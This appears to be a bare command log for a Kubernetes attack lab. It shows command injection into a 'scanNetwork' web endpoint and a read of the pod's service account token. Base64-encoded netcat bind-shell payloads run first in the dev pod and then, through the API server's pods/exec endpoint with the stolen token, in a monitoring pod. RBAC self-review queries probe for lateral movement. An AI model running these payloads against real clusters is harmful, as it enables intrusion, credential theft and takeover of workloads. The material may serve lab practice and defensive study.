kubectl apply -f .

kubectl get pods -A -w

export DEV_POD=app-deployment-788f48bd99-6gvj4
export MONITORING_POD=monitoring-deployment-547dfd684d-d58wl

kubectl port-forward $DEV_POD -n dev 3000:8080

kubectl port-forward $DEV_POD -n dev 9999:9999

127.0.0.1

; cat ../var/run/secrets/kubernetes.io/serviceaccount/token



curl --path-as-is -kis -X 'POST' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'ip=; echo cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgLWxwIDk5OTkgPiAvdG1wL2Y | base64 -d | tee /tmp/rev.sh; sh /tmp/rev.sh' \
    'http://localhost:3000/scanNetwork' &

nc 127.0.0.1 9999

script -qc /bin/bash /dev/null

APISERVER=https://kubernetes.default.svc \
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount \
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace) \
TOKEN=$(cat ${SERVICEACCOUNT}/token) \
CACERT=${SERVICEACCOUNT}/ca.crt \

### Can i list pods in the monitoring namespace?
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" \
     -X POST ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
     -s -H 'Content-Type: application/json' \
     -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","metadata":{"namespace":"dev"},"spec":{"resourceAttributes":{"namespace":"monitoring","verb":"list","resource":"pods"}}}'


### What can I do inside namespace monitoring ?
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" \
     -X POST ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
     -s -H 'Content-Type: application/json' \
     -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"monitoring"}}'

export MONITORING_POD=



curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET "${APISERVER}/api/v1/namespaces/monitoring/pods/$MONITORING_POD/exec?command=sh&command=-c&command=echo%20cm0gLXJmIC90bXAveDsgbWtmaWZvIC90bXAveDsgY2F0IC90bXAveCB8IC9iaW4vc2ggLWkgMj4mMSB8IG5jIC1scCA5OTk5ID4gL3RtcC94%20|%20base64%20-d%20|tee%20/tmp/rev.sh&tty=false&stdin=true&stderr=true&stdout=true" \
     -s \
     -H 'Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==' \
     -H 'Sec-WebSocket-Version: 13' \
     -H 'connection: upgrade' \
     -H 'upgrade: websocket' \
     --http1.1

curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET "${APISERVER}/api/v1/namespaces/monitoring/pods/$MONITORING_POD/exec?command=sh&command=-c&command=/bin/sh%20/tmp/rev.sh&tty=false&stdin=true&stderr=true&stdout=true" \
     -s \
     -H 'Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==' \
     -H 'Sec-WebSocket-Version: 13' \
     -H 'connection: upgrade' \
     -H 'upgrade: websocket' \
     --http1.1 \
     &

curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET \
     -s \
     "${APISERVER}/api/v1/namespaces/monitoring/pods/$MONITORING_POD" \
     | grep ip

nc $POD_IP 9999

script -qc /bin/bash /dev/null


APISERVER=https://kubernetes.default.svc \
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount \
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace) \
TOKEN=$(cat ${SERVICEACCOUNT}/token) \
CACERT=${SERVICEACCOUNT}/ca.crt \

### What can I do inside namespace monitoring
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" \
     -X POST ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
     -s -H 'Content-Type: application/json' \
     -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"monitoring"}}'

### What can I do inside namespace dev
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" \
     -X POST ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
     -s -H 'Content-Type: application/json' \
     -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"dev"}}'



